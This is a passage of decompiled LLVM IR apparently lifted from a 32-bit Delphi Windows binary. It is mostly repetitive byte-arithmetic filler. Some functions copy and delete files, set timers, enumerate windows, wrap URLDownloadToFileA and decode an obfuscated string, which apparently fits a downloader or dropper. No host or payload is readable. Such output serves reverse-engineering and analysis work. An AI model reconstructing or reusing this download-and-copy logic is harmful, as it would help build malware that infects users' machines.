  store i8 %4, i8* %5, align 1, !insn.addr !1309
  %6 = load i8, i8* %0, align 4, !insn.addr !1310
  %7 = load i32, i32* %eax, align 4
  %8 = trunc i32 %7 to i8, !insn.addr !1310
  %9 = add i8 %6, %8, !insn.addr !1310
  %10 = inttoptr i32 %7 to i8*, !insn.addr !1310
  store i8 %9, i8* %10, align 1, !insn.addr !1310
  %11 = load i8, i8* %0, align 4, !insn.addr !1311
  %12 = load i32, i32* %eax, align 4
  %13 = trunc i32 %12 to i8, !insn.addr !1311
  %14 = add i8 %11, %13, !insn.addr !1311
  %15 = inttoptr i32 %12 to i8*, !insn.addr !1311
  store i8 %14, i8* %15, align 1, !insn.addr !1311
  %16 = load i8, i8* %0, align 4, !insn.addr !1312
  %17 = load i32, i32* %eax, align 4
  %18 = trunc i32 %17 to i8, !insn.addr !1312
  %19 = add i8 %16, %18, !insn.addr !1312
  %20 = inttoptr i32 %17 to i8*, !insn.addr !1312
  store i8 %19, i8* %20, align 1, !insn.addr !1312
  %21 = load i8, i8* %0, align 4, !insn.addr !1313
  %22 = load i32, i32* %eax, align 4
  %23 = trunc i32 %22 to i8, !insn.addr !1313
  %24 = add i8 %21, %23, !insn.addr !1313
  %25 = inttoptr i32 %22 to i8*, !insn.addr !1313
  store i8 %24, i8* %25, align 1, !insn.addr !1313
  %26 = load i8, i8* %0, align 4, !insn.addr !1314
  %27 = load i32, i32* %eax, align 4
  %28 = trunc i32 %27 to i8, !insn.addr !1314
  %29 = add i8 %26, %28, !insn.addr !1314
  %30 = inttoptr i32 %27 to i8*, !insn.addr !1314
  store i8 %29, i8* %30, align 1, !insn.addr !1314
  %31 = load i8, i8* %0, align 4, !insn.addr !1315
  %32 = load i32, i32* %eax, align 4
  %33 = trunc i32 %32 to i8, !insn.addr !1315
  %34 = add i8 %31, %33, !insn.addr !1315
  %35 = inttoptr i32 %32 to i8*, !insn.addr !1315
  store i8 %34, i8* %35, align 1, !insn.addr !1315
  %36 = load i8, i8* %0, align 4, !insn.addr !1316
  %37 = load i32, i32* %eax, align 4
  %38 = trunc i32 %37 to i8, !insn.addr !1316
  %39 = add i8 %36, %38, !insn.addr !1316
  %40 = inttoptr i32 %37 to i8*, !insn.addr !1316
  store i8 %39, i8* %40, align 1, !insn.addr !1316
  %41 = load i8, i8* %0, align 4, !insn.addr !1317
  %42 = load i32, i32* %eax, align 4
  %43 = trunc i32 %42 to i8, !insn.addr !1317
  %44 = add i8 %41, %43, !insn.addr !1317
  %45 = inttoptr i32 %42 to i8*, !insn.addr !1317
  store i8 %44, i8* %45, align 1, !insn.addr !1317
  %46 = load i8, i8* %0, align 4, !insn.addr !1318
  %47 = load i32, i32* %eax, align 4
  %48 = trunc i32 %47 to i8, !insn.addr !1318
  %49 = add i8 %46, %48, !insn.addr !1318
  %50 = inttoptr i32 %47 to i8*, !insn.addr !1318
  store i8 %49, i8* %50, align 1, !insn.addr !1318
  %51 = load i8, i8* %0, align 4, !insn.addr !1319
  %52 = load i32, i32* %eax, align 4
  %53 = trunc i32 %52 to i8, !insn.addr !1319
  %54 = add i8 %51, %53, !insn.addr !1319
  %55 = inttoptr i32 %52 to i8*, !insn.addr !1319
  store i8 %54, i8* %55, align 1, !insn.addr !1319
  %56 = load i8, i8* %0, align 4, !insn.addr !1320
  %57 = load i32, i32* %eax, align 4
  %58 = trunc i32 %57 to i8, !insn.addr !1320
  %59 = add i8 %56, %58, !insn.addr !1320
  %60 = inttoptr i32 %57 to i8*, !insn.addr !1320
  store i8 %59, i8* %60, align 1, !insn.addr !1320
  %61 = load i8, i8* %0, align 4, !insn.addr !1321
  %62 = load i32, i32* %eax, align 4
  %63 = trunc i32 %62 to i8, !insn.addr !1321
  %64 = add i8 %61, %63, !insn.addr !1321
  %65 = inttoptr i32 %62 to i8*, !insn.addr !1321
  store i8 %64, i8* %65, align 1, !insn.addr !1321
  %66 = load i8, i8* %0, align 4, !insn.addr !1322
  %67 = load i32, i32* %eax, align 4
  %68 = trunc i32 %67 to i8, !insn.addr !1322
  %69 = add i8 %66, %68, !insn.addr !1322
  %70 = inttoptr i32 %67 to i8*, !insn.addr !1322
  store i8 %69, i8* %70, align 1, !insn.addr !1322
  %71 = load i8, i8* %0, align 4, !insn.addr !1323
  %72 = load i32, i32* %eax, align 4
  %73 = trunc i32 %72 to i8, !insn.addr !1323
  %74 = add i8 %71, %73, !insn.addr !1323
  %75 = inttoptr i32 %72 to i8*, !insn.addr !1323
  store i8 %74, i8* %75, align 1, !insn.addr !1323
  %76 = load i8, i8* %0, align 4, !insn.addr !1324
  %77 = load i32, i32* %eax, align 4
  %78 = trunc i32 %77 to i8, !insn.addr !1324
  %79 = add i8 %76, %78, !insn.addr !1324
  %80 = inttoptr i32 %77 to i8*, !insn.addr !1324
  store i8 %79, i8* %80, align 1, !insn.addr !1324
  %81 = load i8, i8* %0, align 4, !insn.addr !1325
  %82 = load i32, i32* %eax, align 4
  %83 = trunc i32 %82 to i8, !insn.addr !1325
  %84 = add i8 %81, %83, !insn.addr !1325
  %85 = inttoptr i32 %82 to i8*, !insn.addr !1325
  store i8 %84, i8* %85, align 1, !insn.addr !1325
  %86 = load i8, i8* %0, align 4, !insn.addr !1326
  %87 = load i32, i32* %eax, align 4
  %88 = trunc i32 %87 to i8, !insn.addr !1326
  %89 = add i8 %86, %88, !insn.addr !1326
  %90 = inttoptr i32 %87 to i8*, !insn.addr !1326
  store i8 %89, i8* %90, align 1, !insn.addr !1326
  %91 = load i8, i8* %0, align 4, !insn.addr !1327
  %92 = load i32, i32* %eax, align 4
  %93 = trunc i32 %92 to i8, !insn.addr !1327
  %94 = add i8 %91, %93, !insn.addr !1327
  %95 = inttoptr i32 %92 to i8*, !insn.addr !1327
  store i8 %94, i8* %95, align 1, !insn.addr !1327
  %96 = load i8, i8* %0, align 4, !insn.addr !1328
  %97 = load i32, i32* %eax, align 4
  %98 = trunc i32 %97 to i8, !insn.addr !1328
  %99 = add i8 %96, %98, !insn.addr !1328
  %100 = inttoptr i32 %97 to i8*, !insn.addr !1328
  store i8 %99, i8* %100, align 1, !insn.addr !1328
  %101 = load i8, i8* %0, align 4, !insn.addr !1329
  %102 = load i32, i32* %eax, align 4
  %103 = trunc i32 %102 to i8, !insn.addr !1329
  %104 = add i8 %101, %103, !insn.addr !1329
  %105 = inttoptr i32 %102 to i8*, !insn.addr !1329
  store i8 %104, i8* %105, align 1, !insn.addr !1329
  %106 = load i8, i8* %0, align 4, !insn.addr !1330
  %107 = load i32, i32* %eax, align 4
  %108 = trunc i32 %107 to i8, !insn.addr !1330
  %109 = add i8 %106, %108, !insn.addr !1330
  %110 = inttoptr i32 %107 to i8*, !insn.addr !1330
  store i8 %109, i8* %110, align 1, !insn.addr !1330
  %111 = load i8, i8* %0, align 4, !insn.addr !1331
  %112 = load i32, i32* %eax, align 4
  %113 = trunc i32 %112 to i8, !insn.addr !1331
  %114 = add i8 %111, %113, !insn.addr !1331
  %115 = inttoptr i32 %112 to i8*, !insn.addr !1331
  store i8 %114, i8* %115, align 1, !insn.addr !1331
  %116 = load i8, i8* %0, align 4, !insn.addr !1332
  %117 = load i32, i32* %eax, align 4
  %118 = trunc i32 %117 to i8, !insn.addr !1332
  %119 = add i8 %116, %118, !insn.addr !1332
  %120 = inttoptr i32 %117 to i8*, !insn.addr !1332
  store i8 %119, i8* %120, align 1, !insn.addr !1332
  %121 = load i8, i8* %0, align 4, !insn.addr !1333
  %122 = load i32, i32* %eax, align 4
  %123 = trunc i32 %122 to i8, !insn.addr !1333
  %124 = add i8 %121, %123, !insn.addr !1333
  %125 = inttoptr i32 %122 to i8*, !insn.addr !1333
  store i8 %124, i8* %125, align 1, !insn.addr !1333
  %126 = load i8, i8* %0, align 4, !insn.addr !1334
  %127 = load i32, i32* %eax, align 4
  %128 = trunc i32 %127 to i8, !insn.addr !1334
  %129 = add i8 %126, %128, !insn.addr !1334
  %130 = inttoptr i32 %127 to i8*, !insn.addr !1334
  store i8 %129, i8* %130, align 1, !insn.addr !1334
  %131 = load i8, i8* %0, align 4, !insn.addr !1335
  %132 = load i32, i32* %eax, align 4
  %133 = trunc i32 %132 to i8, !insn.addr !1335
  %134 = add i8 %131, %133, !insn.addr !1335
  %135 = inttoptr i32 %132 to i8*, !insn.addr !1335
  store i8 %134, i8* %135, align 1, !insn.addr !1335
  %136 = load i8, i8* %0, align 4, !insn.addr !1336
  %137 = load i32, i32* %eax, align 4
  %138 = trunc i32 %137 to i8, !insn.addr !1336
  %139 = add i8 %136, %138, !insn.addr !1336
  %140 = inttoptr i32 %137 to i8*, !insn.addr !1336
  store i8 %139, i8* %140, align 1, !insn.addr !1336
  %141 = load i8, i8* %0, align 4, !insn.addr !1337
  %142 = load i32, i32* %eax, align 4
  %143 = trunc i32 %142 to i8, !insn.addr !1337
  %144 = add i8 %141, %143, !insn.addr !1337
  %145 = inttoptr i32 %142 to i8*, !insn.addr !1337
  store i8 %144, i8* %145, align 1, !insn.addr !1337
  %146 = load i8, i8* %0, align 4, !insn.addr !1338
  %147 = load i32, i32* %eax, align 4
  %148 = trunc i32 %147 to i8, !insn.addr !1338
  %149 = add i8 %146, %148, !insn.addr !1338
  %150 = inttoptr i32 %147 to i8*, !insn.addr !1338
  store i8 %149, i8* %150, align 1, !insn.addr !1338
  %151 = load i8, i8* %0, align 4, !insn.addr !1339
  %152 = load i32, i32* %eax, align 4
  %153 = trunc i32 %152 to i8, !insn.addr !1339
  %154 = add i8 %151, %153, !insn.addr !1339
  %155 = inttoptr i32 %152 to i8*, !insn.addr !1339
  store i8 %154, i8* %155, align 1, !insn.addr !1339
  %156 = load i8, i8* %0, align 4, !insn.addr !1340
  %157 = load i32, i32* %eax, align 4
  %158 = trunc i32 %157 to i8, !insn.addr !1340
  %159 = add i8 %156, %158, !insn.addr !1340
  %160 = inttoptr i32 %157 to i8*, !insn.addr !1340
  store i8 %159, i8* %160, align 1, !insn.addr !1340
  %161 = load i8, i8* %0, align 4, !insn.addr !1341
  %162 = load i32, i32* %eax, align 4
  %163 = trunc i32 %162 to i8, !insn.addr !1341
  %164 = add i8 %161, %163, !insn.addr !1341
  %165 = inttoptr i32 %162 to i8*, !insn.addr !1341
  store i8 %164, i8* %165, align 1, !insn.addr !1341
  %166 = load i8, i8* %0, align 4, !insn.addr !1342
  %167 = load i32, i32* %eax, align 4
  %168 = trunc i32 %167 to i8, !insn.addr !1342
  %169 = add i8 %166, %168, !insn.addr !1342
  %170 = inttoptr i32 %167 to i8*, !insn.addr !1342
  store i8 %169, i8* %170, align 1, !insn.addr !1342
  store i32 0, i32* %stack_var_-16, align 4, !insn.addr !1343
  %171 = call i32 @__readfsdword(i32 0), !insn.addr !1344
  store i32 %171, i32* %stack_var_-48, align 4, !insn.addr !1344
  %172 = ptrtoint i32* %stack_var_-48 to i32, !insn.addr !1344
  call void @__writefsdword(i32 0, i32 %172), !insn.addr !1345
  store i32 %arg1, i32* %stack_var_-56, align 4, !insn.addr !1346
  %173 = ptrtoint i32* %stack_var_-56 to i32, !insn.addr !1346
  %174 = call i32 @GetClassLongA(i32* inttoptr (i32 -1 to i32*), i32 ptrtoint (i32* @0 to i32)), !insn.addr !1347
  %175 = icmp eq i32 %174, 32770, !insn.addr !1348
  %176 = icmp eq i1 %175, false, !insn.addr !1349
  store i32 %173, i32* %esp.0.reg2mem, !insn.addr !1349
  br i1 %176, label %dec_label_pc_4063d0, label %dec_label_pc_406324, !insn.addr !1349

dec_label_pc_406324:                              ; preds = %dec_label_pc_4062a8
  %177 = call i32 @function_4074bc(), !insn.addr !1350
  %178 = call i32 @"@LStrPos"(), !insn.addr !1351
  %179 = call i32 @"@LStrPos"(), !insn.addr !1352
  %180 = add i32 %179, -1, !insn.addr !1353
  %181 = icmp slt i32 %180, 0, !insn.addr !1354
  %182 = add i32 %178, 2, !insn.addr !1355
  %183 = icmp sgt i32 %182, %180, !insn.addr !1356
  %or.cond = or i1 %181, %183
  store i32 %173, i32* %esp.0.reg2mem, !insn.addr !1357
  br i1 %or.cond, label %dec_label_pc_4063d0, label %dec_label_pc_406358, !insn.addr !1357

dec_label_pc_406358:                              ; preds = %dec_label_pc_406324
  %184 = ptrtoint i32* %stack_var_-16 to i32, !insn.addr !1358
  store i32 %184, i32* %stack_var_-60, align 4, !insn.addr !1358
  %185 = ptrtoint i32* %stack_var_-60 to i32, !insn.addr !1358
  %186 = call i32 @"@LStrCopy"(), !insn.addr !1359
  %187 = load i32, i32* %stack_var_-16, align 4, !insn.addr !1360
  %188 = icmp eq i32 %187, 0, !insn.addr !1360
  store i32 %185, i32* %esp.0.reg2mem, !insn.addr !1361
  br i1 %188, label %dec_label_pc_4063d0, label %dec_label_pc_406380, !insn.addr !1361

dec_label_pc_406380:                              ; preds = %dec_label_pc_406358
  %189 = call i32 @function_4072a4(), !insn.addr !1362
  %190 = call i32 @"@LStrFromPChar"(), !insn.addr !1363
  %191 = call i32 @"@LStrCat"(), !insn.addr !1364
  %192 = call i32 @function_4036c8(), !insn.addr !1365
  %193 = inttoptr i32 %192 to i8*, !insn.addr !1366
  %194 = call i1 @DeleteFileA(i8* %193), !insn.addr !1367
  %195 = call i32 @function_4036c8(), !insn.addr !1368
  %196 = inttoptr i32 %195 to i8*, !insn.addr !1369
  store i8* %196, i8** %stack_var_-76, align 4, !insn.addr !1369
  %197 = ptrtoint i8** %stack_var_-76 to i32, !insn.addr !1369
  %198 = call i1 @CopyFileA(i8* %196, i8* bitcast (i32* @0 to i8*), i1 ptrtoint (i32* @0 to i1)), !insn.addr !1370
  %199 = call i32 @function_405d98(), !insn.addr !1371
  store i32 %197, i32* %esp.0.reg2mem, !insn.addr !1371
  br label %dec_label_pc_4063d0, !insn.addr !1371

dec_label_pc_4063d0:                              ; preds = %dec_label_pc_406380, %dec_label_pc_406358, %dec_label_pc_406324, %dec_label_pc_4062a8
  %esp.0.reload = load i32, i32* %esp.0.reg2mem
  %200 = inttoptr i32 %esp.0.reload to i32*, !insn.addr !1372
  %201 = load i32, i32* %200, align 4, !insn.addr !1372
  call void @__writefsdword(i32 0, i32 %201), !insn.addr !1373
  %202 = add i32 %esp.0.reload, 8, !insn.addr !1374
  %203 = inttoptr i32 %202 to i32*, !insn.addr !1374
  store i32 4219890, i32* %203, align 4, !insn.addr !1374
  %204 = call i32 @"@LStrArrayClr"(), !insn.addr !1375
  ret i32 %204, !insn.addr !1376
}

define i32 @function_4063eb() local_unnamed_addr {
dec_label_pc_4063eb:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !1377
  ret i32 %0, !insn.addr !1377
}

define i32 @function_4063f0() local_unnamed_addr {
dec_label_pc_4063f0:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1378
}

define i32 @function_4063f2(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_4063f2:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = add i32 %0, -4, !insn.addr !1379
  %2 = inttoptr i32 %1 to i32*, !insn.addr !1379
  %3 = load i32, i32* %2, align 4, !insn.addr !1379
  ret i32 %3, !insn.addr !1380
}

define i32 @function_406403() local_unnamed_addr {
dec_label_pc_406403:
  %0 = call i32 @__decompiler_undefined_function_0()
  %eax = alloca i32, align 4
  %1 = add i32 %0, 1, !insn.addr !1381
  %2 = inttoptr i32 %0 to i32*, !insn.addr !1381
  store i32 %1, i32* %2, align 4, !insn.addr !1381
  %3 = bitcast i32* %eax to i8*
  %4 = load i8, i8* %3, align 4, !insn.addr !1382
  %5 = load i32, i32* %eax, align 4
  %6 = trunc i32 %5 to i8, !insn.addr !1382
  %7 = add i8 %4, %6, !insn.addr !1382
  %8 = inttoptr i32 %5 to i8*, !insn.addr !1382
  store i8 %7, i8* %8, align 1, !insn.addr !1382
  %9 = load i32, i32* %eax, align 4, !insn.addr !1383
  ret i32 %9, !insn.addr !1383
}

define i32 @function_406412() local_unnamed_addr {
dec_label_pc_406412:
  %0 = call i32 @__decompiler_undefined_function_0()
  %edx = alloca i32, align 4
  %1 = call i32 @__decompiler_undefined_function_0()
  %2 = call i32 @__decompiler_undefined_function_0()
  %3 = trunc i32 %2 to i8
  %4 = mul i8 %3, 2, !insn.addr !1384
  %5 = inttoptr i32 %2 to i8*, !insn.addr !1384
  store i8 %4, i8* %5, align 1, !insn.addr !1384
  %6 = mul i32 %0, 4096, !insn.addr !1385
  %7 = udiv i32 %0, 1048576, !insn.addr !1385
  %8 = or i32 %7, %6, !insn.addr !1385
  %9 = and i32 %0, 1048576, !insn.addr !1385
  %10 = icmp eq i32 %9, 0, !insn.addr !1385
  %11 = load i32, i32* %edx, align 4, !insn.addr !1386
  %12 = trunc i32 %11 to i16, !insn.addr !1386
  %13 = call i8 @__asm_in(i16 %12), !insn.addr !1386
  %14 = sext i8 %13 to i32, !insn.addr !1386
  %15 = or i32 %2, %14, !insn.addr !1386
  %16 = select i1 %10, i32 0, i32 255, !insn.addr !1387
  %17 = and i32 %15, -256, !insn.addr !1387
  %18 = or i32 %17, %16, !insn.addr !1387
  %19 = inttoptr i32 %18 to i8*, !insn.addr !1388
  %20 = load i8, i8* %19, align 1, !insn.addr !1388
  %21 = mul i8 %20, 2, !insn.addr !1388
  %22 = lshr i8 %20, 7, !insn.addr !1388
  %23 = or i8 %22, %21, !insn.addr !1388
  store i8 %23, i8* %19, align 1, !insn.addr !1388
  %24 = bitcast i32* %edx to i8*
  %25 = load i8, i8* %24, align 4, !insn.addr !1389
  %26 = udiv i32 %1, 256, !insn.addr !1389
  %27 = trunc i32 %26 to i8, !insn.addr !1389
  %28 = add i8 %25, %27, !insn.addr !1389
  %29 = load i32, i32* %edx, align 4, !insn.addr !1389
  %30 = inttoptr i32 %29 to i8*, !insn.addr !1389
  store i8 %28, i8* %30, align 1, !insn.addr !1389
  %31 = add i32 %8, -4, !insn.addr !1390
  %32 = inttoptr i32 %31 to i32*, !insn.addr !1390
  store i32 4219628, i32* %32, align 4, !insn.addr !1390
  %33 = call i1 @EnumWindows(i1 (i32*, i32)* bitcast (i32* @0 to i1 (i32*, i32)*), i32 ptrtoint (i32* @0 to i32)), !insn.addr !1391
  %34 = sext i1 %33 to i32, !insn.addr !1391
  ret i32 %34, !insn.addr !1392
}

define i32 @function_40641c(i32 %arg1) local_unnamed_addr {
dec_label_pc_40641c:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0
}

define i32 @function_40642c() local_unnamed_addr {
dec_label_pc_40642c:
  %stack_var_-16 = alloca i32, align 4
  %0 = call i32 @__readfsdword(i32 0), !insn.addr !1393
  store i32 %0, i32* %stack_var_-16, align 4, !insn.addr !1393
  %1 = ptrtoint i32* %stack_var_-16 to i32, !insn.addr !1393
  call void @__writefsdword(i32 0, i32 %1), !insn.addr !1394
  %2 = load i32, i32* @global_var_4096cc, align 4, !insn.addr !1395
  %3 = add i32 %2, 1, !insn.addr !1395
  store i32 %3, i32* @global_var_4096cc, align 4, !insn.addr !1395
  %4 = load i32, i32* %stack_var_-16, align 4, !insn.addr !1396
  call void @__writefsdword(i32 0, i32 %4), !insn.addr !1397
  ret i32 0, !insn.addr !1398
}

define i32 @function_406451() local_unnamed_addr {
dec_label_pc_406451:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !1399
  ret i32 %0, !insn.addr !1399
}

define i32 @function_406456() local_unnamed_addr {
dec_label_pc_406456:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1400
}

define i32 @function_406458(i32 %arg1) local_unnamed_addr {
dec_label_pc_406458:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1401
}

define i32 @function_40645c() local_unnamed_addr {
dec_label_pc_40645c:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = load i32, i32* @global_var_4096cc, align 4, !insn.addr !1402
  %2 = add i32 %1, -1, !insn.addr !1402
  store i32 %2, i32* @global_var_4096cc, align 4, !insn.addr !1402
  ret i32 %0, !insn.addr !1403
}

define i32 @function_406464() local_unnamed_addr {
dec_label_pc_406464:
  %eax.0.reg2mem = alloca i32, !insn.addr !1404
  %0 = call i32 @function_4064d8(), !insn.addr !1405
  %1 = load i32, i32* @global_var_40812c, align 4
  %2 = icmp eq i32 %1, 0, !insn.addr !1406
  store i32 0, i32* %eax.0.reg2mem, !insn.addr !1407
  br i1 %2, label %dec_label_pc_406498, label %dec_label_pc_406476, !insn.addr !1407

dec_label_pc_406476:                              ; preds = %dec_label_pc_406464
  %3 = load i32, i32* inttoptr (i32 4227412 to i32*), align 4, !insn.addr !1408
  %4 = inttoptr i32 %3 to i32*, !insn.addr !1409
  %5 = load i32, i32* %4, align 4, !insn.addr !1409
  %6 = icmp eq i32 %5, 0, !insn.addr !1409
  store i32 %3, i32* %eax.0.reg2mem, !insn.addr !1410
  br i1 %6, label %dec_label_pc_406498, label %dec_label_pc_406480, !insn.addr !1410

dec_label_pc_406480:                              ; preds = %dec_label_pc_406476
  call void @PostQuitMessage(i32 66), !insn.addr !1411
  %7 = call i32 @function_4043d4(i32 66), !insn.addr !1412
  unreachable, !insn.addr !1412

dec_label_pc_406498:                              ; preds = %dec_label_pc_406476, %dec_label_pc_406464
  %eax.0.reload = load i32, i32* %eax.0.reg2mem
  ret i32 %eax.0.reload, !insn.addr !1413
}

define i32 @function_4064a8() local_unnamed_addr {
dec_label_pc_4064a8:
  %0 = load i32, i32* @global_var_408110, align 4, !insn.addr !1414
  %1 = icmp eq i32 %0, 0, !insn.addr !1414
  br i1 %1, label %dec_label_pc_4064b6, label %dec_label_pc_4064b1, !insn.addr !1415

dec_label_pc_4064b1:                              ; preds = %dec_label_pc_4064a8
  %2 = call i32 @function_4064d8(), !insn.addr !1416
  br label %dec_label_pc_4064b6, !insn.addr !1416

dec_label_pc_4064b6:                              ; preds = %dec_label_pc_4064b1, %dec_label_pc_4064a8
  %3 = load i32, i32* inttoptr (i32 4227400 to i32*), align 8, !insn.addr !1417
  %4 = inttoptr i32 %3 to i32*, !insn.addr !1418
  %5 = load i32, i32* %4, align 4, !insn.addr !1418
  %6 = mul i32 %5, 1000, !insn.addr !1418
  %7 = call i32 @SetTimer(i32* inttoptr (i32 4220004 to i32*), i32 %6, i32 0, void (i32*, i32, i32, i32)* null), !insn.addr !1419
  store i32 %7, i32* @global_var_408110, align 4, !insn.addr !1420
  ret i32 %7, !insn.addr !1421
}

define i32 @function_4064d8() local_unnamed_addr {
dec_label_pc_4064d8:
  %.reg2mem = alloca i32, !insn.addr !1422
  %0 = load i32, i32* @global_var_408110, align 4, !insn.addr !1422
  %1 = icmp eq i32 %0, 0, !insn.addr !1422
  store i32 %0, i32* %.reg2mem, !insn.addr !1423
  br i1 %1, label %2, label %dec_label_pc_4064e1, !insn.addr !1423

; <label>:2:                                      ; preds = %dec_label_pc_4064d8
  %3 = call i32 @function_4064f5(), !insn.addr !1423
  %.pre = load i32, i32* @global_var_408110, align 4
  store i32 %.pre, i32* %.reg2mem, !insn.addr !1423
  br label %dec_label_pc_4064e1, !insn.addr !1423

dec_label_pc_4064e1:                              ; preds = %2, %dec_label_pc_4064d8
  %.reload = load i32, i32* %.reg2mem, !insn.addr !1424
  ret i32 %.reload, !insn.addr !1425
}

define i32 @function_4064f5() local_unnamed_addr {
dec_label_pc_4064f5:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1426
}

define i32 @function_4064f8() local_unnamed_addr {
dec_label_pc_4064f8:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = call i32 @function_40641c(i32 %0), !insn.addr !1427
  ret i32 %1, !insn.addr !1428
}

define i32 @function_406504() local_unnamed_addr {
dec_label_pc_406504:
  %0 = load i32, i32* @global_var_408114, align 4, !insn.addr !1429
  %1 = icmp eq i32 %0, 0, !insn.addr !1429
  br i1 %1, label %dec_label_pc_406512, label %dec_label_pc_40650d, !insn.addr !1430

dec_label_pc_40650d:                              ; preds = %dec_label_pc_406504
  %2 = call i32 @function_40652c(), !insn.addr !1431
  br label %dec_label_pc_406512, !insn.addr !1431

dec_label_pc_406512:                              ; preds = %dec_label_pc_40650d, %dec_label_pc_406504
  %3 = call i32 @SetTimer(i32* inttoptr (i32 4220152 to i32*), i32 5266, i32 0, void (i32*, i32, i32, i32)* null), !insn.addr !1432
  store i32 %3, i32* @global_var_408114, align 4, !insn.addr !1433
  ret i32 %3, !insn.addr !1434
}

define i32 @function_40652c() local_unnamed_addr {
dec_label_pc_40652c:
  %0 = load i32, i32* @global_var_408114, align 4, !insn.addr !1435
  ret i32 %0, !insn.addr !1436
}

define i32 @function_40654c() local_unnamed_addr {
dec_label_pc_40654c:
  %stack_var_-16 = alloca i32, align 4
  %0 = call i32 @__readfsdword(i32 0), !insn.addr !1437
  store i32 %0, i32* %stack_var_-16, align 4, !insn.addr !1437
  %1 = ptrtoint i32* %stack_var_-16 to i32, !insn.addr !1437
  call void @__writefsdword(i32 0, i32 %1), !insn.addr !1438
  %2 = load i32, i32* @global_var_4096d0, align 4, !insn.addr !1439
  %3 = add i32 %2, 1, !insn.addr !1439
  store i32 %3, i32* @global_var_4096d0, align 4, !insn.addr !1439
  %4 = load i32, i32* %stack_var_-16, align 4, !insn.addr !1440
  call void @__writefsdword(i32 0, i32 %4), !insn.addr !1441
  ret i32 0, !insn.addr !1442
}

define i32 @function_406571() local_unnamed_addr {
dec_label_pc_406571:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !1443
  ret i32 %0, !insn.addr !1443
}

define i32 @function_406576() local_unnamed_addr {
dec_label_pc_406576:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1444
}

define i32 @function_406578(i32 %arg1) local_unnamed_addr {
dec_label_pc_406578:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1445
}

define i32 @function_40657c() local_unnamed_addr {
dec_label_pc_40657c:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = load i32, i32* @global_var_4096d0, align 4, !insn.addr !1446
  %2 = add i32 %1, -1, !insn.addr !1446
  store i32 %2, i32* @global_var_4096d0, align 4, !insn.addr !1446
  ret i32 %0, !insn.addr !1447
}

define i32 @function_406584() local_unnamed_addr {
dec_label_pc_406584:
  %0 = call i32 @URLDownloadToFileA.11(), !insn.addr !1448
  ret i32 %0, !insn.addr !1448
}

define i32 @function_40658c() local_unnamed_addr {
dec_label_pc_40658c:
  %esi.0.reg2mem = alloca i32, !insn.addr !1449
  %ebx.0.reg2mem = alloca i32, !insn.addr !1449
  %0 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-32 = alloca i32, align 4
  %1 = call i32 @function_4036b8(), !insn.addr !1450
  %2 = call i32 @__readfsdword(i32 0), !insn.addr !1451
  store i32 %2, i32* %stack_var_-32, align 4, !insn.addr !1451
  %3 = ptrtoint i32* %stack_var_-32 to i32, !insn.addr !1451
  call void @__writefsdword(i32 0, i32 %3), !insn.addr !1452
  %4 = call i32 @function_4034c8(), !insn.addr !1453
  %5 = call i32 @"@LStrSetLength"(), !insn.addr !1454
  %6 = call i32 @function_4034c8(), !insn.addr !1455
  %7 = icmp slt i32 %6, 1
  store i32 1, i32* %ebx.0.reg2mem, !insn.addr !1456
  store i32 %6, i32* %esi.0.reg2mem, !insn.addr !1456
  br i1 %7, label %dec_label_pc_406602, label %dec_label_pc_4065d2, !insn.addr !1456

dec_label_pc_4065d2:                              ; preds = %dec_label_pc_40658c, %dec_label_pc_4065fe
  %esi.0.reload = load i32, i32* %esi.0.reg2mem
  %ebx.0.reload = load i32, i32* %ebx.0.reg2mem
  %8 = add i32 %ebx.0.reload, -1
  %9 = add i32 %8, %0, !insn.addr !1457
  %10 = inttoptr i32 %9 to i8*, !insn.addr !1457
  %11 = load i8, i8* %10, align 1, !insn.addr !1457
  %12 = icmp eq i8 %11, 61, !insn.addr !1457
  %13 = icmp eq i1 %12, false, !insn.addr !1458
  %14 = call i32 @function_403720()
  br i1 %13, label %dec_label_pc_4065ea, label %dec_label_pc_4065dc, !insn.addr !1458

dec_label_pc_4065dc:                              ; preds = %dec_label_pc_4065d2
  %15 = add i32 %14, %8, !insn.addr !1459
  %16 = inttoptr i32 %15 to i8*, !insn.addr !1459
  store i8 46, i8* %16, align 1, !insn.addr !1459
  br label %dec_label_pc_4065fe, !insn.addr !1460

dec_label_pc_4065ea:                              ; preds = %dec_label_pc_4065d2
  %17 = load i8, i8* %10, align 1, !insn.addr !1461
  %18 = add i8 %17, -1, !insn.addr !1462
  %19 = add i32 %14, %8, !insn.addr !1463
  %20 = inttoptr i32 %19 to i8*, !insn.addr !1463
  store i8 %18, i8* %20, align 1, !insn.addr !1463
  br label %dec_label_pc_4065fe, !insn.addr !1463

dec_label_pc_4065fe:                              ; preds = %dec_label_pc_4065ea, %dec_label_pc_4065dc
  %21 = add i32 %ebx.0.reload, 1, !insn.addr !1464
  %22 = add i32 %esi.0.reload, -1, !insn.addr !1465
  %23 = icmp eq i32 %22, 0, !insn.addr !1465
  %24 = icmp eq i1 %23, false, !insn.addr !1466
  store i32 %21, i32* %ebx.0.reg2mem, !insn.addr !1466
  store i32 %22, i32* %esi.0.reg2mem, !insn.addr !1466
  br i1 %24, label %dec_label_pc_4065d2, label %dec_label_pc_406602, !insn.addr !1466

dec_label_pc_406602:                              ; preds = %dec_label_pc_4065fe, %dec_label_pc_40658c
  %25 = load i32, i32* %stack_var_-32, align 4, !insn.addr !1467
  call void @__writefsdword(i32 0, i32 %25), !insn.addr !1468
  %26 = call i32 @"@LStrClr"(), !insn.addr !1469
  ret i32 %26, !insn.addr !1470
}

define i32 @function_406618() local_unnamed_addr {
dec_label_pc_406618:
